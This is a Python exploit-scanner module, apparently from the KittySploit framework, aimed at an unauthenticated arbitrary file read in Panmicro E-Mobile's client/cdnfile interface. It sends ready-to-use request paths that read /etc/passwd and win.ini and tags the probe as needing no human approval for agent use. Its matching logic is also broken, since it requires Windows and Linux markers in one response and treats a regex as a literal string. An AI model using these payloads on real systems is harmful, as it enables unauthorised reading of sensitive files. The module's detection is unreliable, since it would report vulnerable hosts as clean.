#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Panmicro E-Mobile client/cdnfile interface has an arbitrary file reading vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Panmicro E-Mobile System - Arbitrary File Read Detection',
        'description': 'The Panmicro E-Mobile client/cdnfile interface has an arbitrary file reading vulnerability. Unauthenticated attackers can use this vulnerability to read important system files, database configuration files, and so on.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'panmicro', 'e-mobile', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['http://cn-sec.com/archives/3182931.html', 'https://cn-sec.com/archives/3188605.html'],
    }

    def run(self):
        for path in ('/client/cdnfile/1C/Windows/win.ini?windows', '/client/cdnfile/C/etc/passwd?linux'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('bit app support', 'fonts', 'extensions', 'root:.*:0:0:',)
            header_any = ('application/octet-stream', 'text/plain', 'attachment; filename=',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='high',
                    reason="Panmicro E-Mobile System - Arbitrary File Read detected",
                    path=path,
                )
                return True
        return False

